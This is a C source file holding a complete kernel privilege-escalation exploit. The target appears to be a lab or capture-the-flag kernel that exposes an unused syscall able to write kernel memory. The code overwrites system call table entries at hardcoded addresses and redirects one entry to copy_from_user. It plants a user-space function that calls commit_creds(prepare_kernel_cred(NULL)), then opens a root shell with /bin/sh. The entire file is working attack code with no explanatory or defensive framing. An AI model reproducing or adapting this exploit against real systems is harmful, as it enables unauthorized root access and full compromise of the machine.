#include <stdio.h>

#define SYS_CALL_TABLE		0x8000e348		
#define NR_SYS_UNUSED		223

#define COMMIT_ADDR 0x8003f56c
#define PREPARE_ADDR 0x8003f924
#define COPY_FROM_USER 0x8018dd80

typedef int __attribute__((regparm(1)))(*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(1)))(*_prepare_kernel_cred)(unsigned long cred);


long change()//elevate privilege
{

	_commit_creds commit_creds = COMMIT_ADDR;
	_prepare_kernel_cred prepare_kernel_cred = PREPARE_ADDR;
	
	commit_creds(prepare_kernel_cred(NULL));
	
	return 0;
}

void getshell()
{
	system("/bin/sh");
}

int main()
{
	unsigned int** sct = SYS_CALL_TABLE; 
	int  fake_syscall[400] = {0}; 
	unsigned long pre;

	fake_syscall[0] = PREPARE_ADDR; 
	printf("change:%p   fake_syscall:%p    content of fake_syscall:%p %p  syscall table:%p\n",change,fake_syscall,fake_syscall[0],fake_syscall[1],&sct[2]);
	
	
	syscall(NR_SYS_UNUSED,fake_syscall,&sct[224]); 
	pre  = syscall(224,NULL);
	syscall(NR_SYS_UNUSED,&sct[224],&fake_syscall[30]);
	printf("prepare(%p) successful  ret_value:%p\n",fake_syscall[30],pre);


	fake_syscall[0] = COPY_FROM_USER;
	printf("in the fake_syscall:%p\n",fake_syscall[0]);
	syscall(NR_SYS_UNUSED,fake_syscall,&sct[224]); //change table no.244 to copy_from_user

	syscall(NR_SYS_UNUSED,&sct[224],&fake_syscall[30]);
	printf("no.224(%p)\n",fake_syscall[30]);

	fake_syscall[0] = change;
	printf("%p %p\n",fake_syscall[0],fake_syscall[1]);
	syscall(224,&sct[225], fake_syscall,4);//use no.224(copy_from_user) to copy my fake syscall address to no.225
	syscall(NR_SYS_UNUSED,&sct[225],&fake_syscall[30]);
	printf("no.225(%p)\n",fake_syscall[30]);

	syscall(225);//invoke no.225(elevate privilege)




	printf("next\n"); 

	getshell();	

}
